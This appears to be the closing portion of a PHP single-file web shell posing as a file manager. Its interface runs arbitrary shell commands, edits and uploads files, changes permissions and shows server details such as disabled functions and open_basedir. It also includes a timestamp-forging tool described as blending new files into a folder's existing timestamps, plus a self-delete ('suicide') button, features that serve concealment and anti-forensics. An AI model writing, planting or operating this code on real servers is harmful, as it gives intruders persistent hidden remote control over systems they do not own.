<div class="fl bad">File is larger than the editor cap. Use Download.</div>
<?php } else { ?>
<form method="post" action="<?php echo h(u(array('op' => 'save', 'p' => $edit))); ?>">
    <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
    <input type="hidden" name="p" value="<?php echo h($edit); ?>">
    <textarea name="body" spellcheck="false"><?php echo h((string) file_get_contents($edit)); ?></textarea>
    <div class="bar" style="margin-top:12px">
        <button class="btn go" type="submit">Save</button>
        <span class="mut">Ctrl+S / Cmd+S saves</span>
    </div>
</form>
<?php } ?>
<?php } ?>

<?php if ($act === 'exec') { ?>
<div class="bar">
    <form method="post" action="<?php echo h(u(array('op' => 'exec', 'p' => $dir))); ?>" style="display:flex;gap:8px;flex:1;flex-wrap:wrap">
        <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
        <input type="text" name="c" placeholder="command" autofocus style="flex:1;min-width:260px;font-family:ui-monospace,Menlo,monospace">
        <input type="text" name="cwd" value="<?php echo h($dir); ?>" style="width:270px;font-family:ui-monospace,Menlo,monospace;font-size:12px">
        <button class="btn go" type="submit">Run</button>
    </form>
</div>
<?php if ($term !== null) { ?>
<div class="card" style="margin-bottom:12px">
    <h3><?php echo h($term[0]); ?> &nbsp;<span class="mut">in <?php echo h($term[3]); ?> | rc=<?php echo (int) $term[2]; ?> | via <?php echo h($backend === '' ? 'none' : $backend); ?></span></h3>
    <pre><?php echo h($term[1]); ?></pre>
</div>
<?php } ?>
<?php } ?>

<?php if ($act === 'find') { ?>
<div class="bar">
    <form method="get" action="<?php echo h($FM_SELF); ?>" style="display:flex;gap:8px;flex:1;flex-wrap:wrap">
        <input type="hidden" name="op" value="find">
        <input type="hidden" name="p" value="<?php echo h($dir); ?>">
        <input type="text" name="q" value="<?php echo h(isset($_GET['q']) ? $_GET['q'] : ''); ?>" placeholder="filename contains..." autofocus style="flex:1;min-width:240px">
        <button class="btn go" type="submit">Search</button>
    </form>
</div>
<?php if ($results !== null) { ?>
<div class="card">
    <h3><?php echo count($results); ?> result(s) under <?php echo h($dir); ?></h3>
    <pre><?php foreach ($results as $r) { echo h($r) . "\n"; } ?></pre>
</div>
<?php } ?>
<?php } ?>

<?php if ($act !== 'edit') { ?>
<div class="grid" style="margin-top:14px">
    <div class="stack">
        <form class="card" method="post" action="<?php echo h(u(array('op' => 'newdir', 'p' => $dir))); ?>">
            <h3>New folder</h3>
            <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
            <div style="display:flex;gap:8px">
                <input type="text" name="name" placeholder="folder-name" style="flex:1">
                <button class="btn" type="submit">Create</button>
            </div>
        </form>

        <form class="card" method="post" action="<?php echo h(u(array('op' => 'newfile', 'p' => $dir))); ?>">
            <h3>New file</h3>
            <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
            <div style="display:flex;gap:8px">
                <input type="text" name="name" placeholder="file.php" style="flex:1">
                <button class="btn" type="submit">Create</button>
            </div>
        </form>

        <form class="card" method="post" enctype="multipart/form-data" action="<?php echo h(u(array('op' => 'upload', 'p' => $dir))); ?>">
            <h3>Upload</h3>
            <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
            <input type="file" name="f[]" multiple style="width:100%;color:var(--dim)">
            <div class="bar" style="margin:10px 0 0;padding:0;border:0;background:none">
                <button class="btn go" type="submit">Upload to <?php echo h(basename($dir) === '' ? '/' : basename($dir)); ?></button>
            </div>
        </form>

        <form class="card" method="post" action="<?php echo h(u(array('op' => 'chmod', 'p' => $dir))); ?>">
            <h3>chmod</h3>
            <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
            <input type="hidden" name="p" id="chp" value="">
            <div style="display:flex;gap:8px">
                <input type="text" id="chname" placeholder="path (absolute or relative)" style="flex:1;font-family:ui-monospace,Menlo,monospace;font-size:12px">
                <input type="text" name="mode" value="0644" style="width:74px;font-family:ui-monospace,Menlo,monospace">
                <button class="btn" type="submit" onclick="document.getElementById('chp').value=(document.getElementById('chname').value.indexOf('/')===0?document.getElementById('chname').value:'<?php echo h(addslashes($dir)); ?>/'+document.getElementById('chname').value)">Set</button>
            </div>
        </form>

        <form class="card" method="post" action="<?php echo h(u(array('op' => 'move', 'p' => $dir))); ?>">
            <h3>Move</h3>
            <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
            <div class="stack" style="gap:8px">
                <input type="text" name="from" placeholder="source path" style="width:100%;font-family:ui-monospace,Menlo,monospace;font-size:12px">
                <input type="text" name="to" placeholder="destination path" style="width:100%;font-family:ui-monospace,Menlo,monospace;font-size:12px">
                <button class="btn" type="submit">Move</button>
            </div>
        </form>
    </div>

    <div class="stack">
        <div class="card">
            <h3>Server</h3>
            <div class="kv"><span>PHP</span><span><?php echo h(PHP_VERSION . ' ' . PHP_SAPI); ?></span></div>
            <div class="kv"><span>User</span><span><?php echo h(function_exists('posix_geteuid') ? (string) posix_geteuid() : '-'); ?></span></div>
            <div class="kv"><span>CWD</span><span><?php echo h(getcwd()); ?></span></div>
            <div class="kv"><span>Disk free</span><span><?php echo $free === false ? '-' : h(fsize((float) $free)); ?></span></div>
            <div class="kv"><span>exec backend</span><span class="<?php echo $backend === '' ? 'tw' : 'tg'; ?>"><?php echo h($backend === '' ? 'none' : $backend); ?></span></div>
            <div class="kv"><span>disabled</span><span><?php echo h(ini_get('disable_functions') === '' ? 'none' : ini_get('disable_functions')); ?></span></div>
            <div class="kv"><span>open_basedir</span><span><?php echo h(ini_get('open_basedir') === '' ? 'none' : ini_get('open_basedir')); ?></span></div>
            <div class="kv"><span>upload_max</span><span><?php echo h((string) ini_get('upload_max_filesize')); ?></span></div>
            <div class="kv"><span>post_max</span><span><?php echo h((string) ini_get('post_max_size')); ?></span></div>
            <div class="kv"><span>this file</span><span><?php echo h(__FILE__); ?></span></div>
        </div>

        <div class="card">
            <h3>Timestamp</h3>
            <form method="post" action="<?php echo h(u(array('op' => 'stamp', 'p' => $dir))); ?>" class="stack" style="gap:8px">
                <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
                <input type="hidden" name="p" id="sp" value="">
                <div><label class="t" for="sname">path</label>
                <input type="text" id="sname" style="width:100%;font-family:ui-monospace,Menlo,monospace;font-size:12px" placeholder="path (absolute or relative)"></div>
                <div><label class="t" for="swhen">set mtime to</label>
                <input type="text" id="swhen" name="when" value="<?php echo h(date('Y-m-d H:i')); ?>" style="width:100%"></div>
                <button class="btn" type="submit" onclick="document.getElementById('sp').value=(document.getElementById('sname').value.indexOf('/')===0?document.getElementById('sname').value:'<?php echo h(addslashes($dir)); ?>/'+document.getElementById('sname').value)">Apply</button>
            </form>
            <div class="hint">Blends a fresh file into the folder's existing timestamps.</div>
        </div>

        <div class="card">
            <h3>Session</h3>
            <div class="kv"><span>Active since</span><span><?php echo h(date('Y-m-d H:i', isset($_SESSION['fm_at']) ? (int) $_SESSION['fm_at'] : time())); ?></span></div>
            <div class="kv"><span>Idle timeout</span><span><?php echo $FM_TIMEOUT > 0 ? (int) $FM_TIMEOUT . 's' : 'never'; ?></span></div>
            <div class="kv"><span>IP lock</span><span><?php echo $FM_IP_LOCK ? 'on' : 'off'; ?></span></div>
            <form method="post" action="<?php echo h(u(array('op' => 'passwd'))); ?>" class="stack" style="gap:8px;margin-top:10px">
                <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
                <div><label class="t" for="pwcur">current password</label>
                <input type="password" id="pwcur" name="cur" style="width:100%" autocomplete="off"></div>
                <div><label class="t" for="pwnew">new password</label>
                <input type="password" id="pwnew" name="newpw" style="width:100%" autocomplete="off"></div>
                <button class="btn" type="submit">Change password</button>
            </form>
            <form method="post" action="<?php echo h(u(array('op' => 'suicide'))); ?>" style="margin-top:10px" onsubmit="return confirm('Delete this file from the server?')">
                <input type="hidden" name="t" value="<?php echo h($csrf); ?>">
                <button class="btn danger" type="submit" style="width:100%">Delete this file</button>
            </form>
        </div>
    </div>
</div>

<script>
document.addEventListener('keydown', function (e) {
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
        var t = document.querySelector('form textarea');
        if (t) {
            e.preventDefault();
            t.form.submit();
        }
    }
});
</script>
<?php } ?>
</div>
</body>
</html>
